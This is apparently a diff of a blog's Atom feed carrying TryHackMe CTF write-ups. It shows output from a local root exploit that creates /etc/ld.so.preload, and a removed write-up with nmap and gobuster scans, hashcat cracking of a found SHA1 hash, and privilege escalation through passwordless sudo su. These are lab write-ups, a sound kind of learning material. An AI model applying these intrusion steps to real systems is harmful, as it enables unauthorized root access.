+    wait(NULL);
+    ^
+5 warnings generated.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A few warmming messages are generated however the exploit still works and we get a root shell!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu:/tmp$ ./exploit 
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Darryn</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="tryhackme" />
+      
+        <category term="ctf" />
+      
+        <category term="medium" />
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
   
     <entry>
       <title type="html">SQHell Write Up</title>
@@ -3046,161 +3649,6 @@ brookly_nine_nine
 root.txt
 #
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Darryn</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="tryhackme" />
-      
-        <category term="ctf" />
-      
-        <category term="easy" />
-      
-
-      
-        <summary type="html"></summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">CC: Pentesting Write Up</title>
-      <link href="https://darrynbrownfield.co.uk/ccpentesting" rel="alternate" type="text/html" title="CC: Pentesting Write Up" />
-      <published>2020-12-08T00:00:00+00:00</published>
-      <updated>2020-12-08T00:00:00+00:00</updated>
-      <id>https://darrynbrownfield.co.uk/ccpentesting</id>
-      <content type="html" xml:base="https://darrynbrownfield.co.uk/ccpentesting">&lt;p&gt;&lt;img src=&quot;/assets/images/ccpentesting/cover.png&quot; alt=&quot;CCPentesting&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/ccpentesting&quot;&gt;CC:Pen Testing&lt;/a&gt; is a guided room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; providing an introduction to some of the common penetration testing tools. Its really well layed out and I recommend to anyone starting out in penetration testing or CTF challenges. This write up will only cover the steps for the final exam.&lt;/p&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;As normal, I kicked off a nmap scan to see what ports are available.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA initial 10.10.215.190
-[sudo] password for daz: 
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-08 21:42 GMT
-Nmap scan report for 10.10.215.190
-Host is up (0.027s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 12:96:a6:1e:81:73:ae:17:4c:e1:7c:63:78:3c:71:1c (RSA)
-|   256 6d:9c:f2:07:11:d2:aa:19:99:90:bb:ec:6b:a1:53:77 (ECDSA)
-|_  256 0e:a5:fa:ce:f2:ad:e6:fa:99:f3:92:5f:87:bb:ba:f4 (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;2 Ports open:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
-  &lt;li&gt;80 - HTTP - Apache web server version 2.4.18&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;
-
-&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
-
-&lt;p&gt;The web page displays the basic apache page, I checked the source code but everything was standard. I kicked off a gobuster to see what other directories were available.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.215.190 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.215.190
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2020/12/08 21:49:12 Starting gobuster
-===============================================================
-/secret (Status: 301)
-/server-status (Status: 403)
-===============================================================
-2020/12/08 21:51:09 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;One directory found ‘/secret’, going to secret doesn’t display anything. I ran a second gobuster but this time in the secret folder and checked for .log, .txt and .html using the -x flag.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.215.190/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x log,txt,html
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.215.190/secret
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Extensions:     log,txt,html
-[+] Timeout:        10s
-===============================================================
-2020/12/08 21:55:16 Starting gobuster
-===============================================================
-/index.html (Status: 200)
-/secret.txt (Status: 200)
-Progress: 49450 / 220561 (22.42%)^C
-[!] Keyboard interrupt detected, terminating.
-===============================================================
-2020/12/08 21:59:31 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
-
-&lt;p&gt;1 additional file found, secret.txt. Web browsing to http://10.10.215.190/secret/secret.txt I could see the contents of the file:&lt;/p&gt;
-
-&lt;p&gt;nyan:046385855FC9580393853D8E(REDACTED)&lt;/p&gt;
-
-&lt;p&gt;The password looks to be SHA1. I put the hash in to a file called hash.txt on my VM and ran hashcat with the command: hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt –force&lt;/p&gt;
-
-&lt;p&gt;Hashcat was successfully able to crack the hash and I was able to SSH in to the machine.&lt;/p&gt;
-
-&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
-
-&lt;p&gt;Once connected via SSH I ran ‘sudo -l’, the user nyan is able to run the command /bin/su as root without providing a password. This provides a simple privesc by using the command: ‘sudo su’&lt;/p&gt;
-
-&lt;p&gt;Other techniques like this can be found on &lt;a href=&quot;https://gtfobins.github.io&quot;&gt;gtfobins&lt;/a&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;nyan@ubuntu:~$ sudo -l
-Matching Defaults entries for nyan on ubuntu:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User nyan may run the following commands on ubuntu:
-    (root) NOPASSWD: /bin/su
-nyan@ubuntu:~$
-nyan@ubuntu:~$ sudo su
-root@ubuntu:/home/nyan# id
-uid=0(root) gid=0(root) groups=0(root)
-root@ubuntu:/home/nyan# 
-&lt;/code&gt;&lt;/pre&gt;
-
 &lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
 
       
